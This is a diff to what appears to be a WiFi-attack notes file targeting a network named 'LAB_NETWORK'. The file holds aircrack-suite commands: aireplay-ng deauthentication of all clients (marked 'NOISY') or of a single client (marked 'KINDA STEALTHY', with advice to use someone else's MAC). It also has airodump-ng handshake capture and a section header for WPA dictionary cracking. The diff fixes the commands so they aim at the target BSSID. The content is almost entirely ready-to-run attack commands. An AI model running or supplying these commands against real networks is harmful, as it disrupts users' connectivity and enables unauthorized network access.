@@ -86,6 +86,8 @@ target_essid = "LAB_NETWORK"
 target_bssid = "AC:84:C6:94:DA:08"
 target_channel = "6" #to parse as int when needed but used as str most of the time
 wlan_mac = "F4:28:53:14:88:3B" #mac address of wlan_device
+wlan_logical = "wlan1"
+host_mac = "A4:FF:12:14:90:B3"
 
 
 #====DEAUTH ATTACK====
@@ -93,12 +95,12 @@ wlan_mac = "F4:28:53:14:88:3B" #mac address of wlan_device
 #This command can be used for both handshake capture and WiFi DOS attack.
 
 #This command deauths all devices continously.
-aireplay-ng -0 0 -a $wlan_mac $wlan_device #NOISY
+aireplay-ng -0 0 -a $target_bssid $wlan_logical #NOISY
 
 #This command deauths specific device continously.
 #You'd wanna use someone else's or your other device's 
 #MAC address who's able to connect already.
-aireplay-ng -0 0 -a $wlan_mac -c $wlan_mac $wlan_device #KINDA STEALTHY
+aireplay-ng -0 0 -a $target_bssid -c $host_mac $wlan_logical #KINDA STEALTHY
 
 
 #====HANDSHAKE CAPTURE====
@@ -109,7 +111,6 @@ airodump-ng -c $target_channel --bssid $target_bssid --update 1 -w capture $wlan
 #It is optional to execute deauth attack simultaneously or just after handshake capture began
 #since the term 'handshake capture' implies that it must catch attempts of other hosts to 
 #connect to the target WiFi network.
-
 
 #====WPA CRACKING VIA DICTIONARY====
 
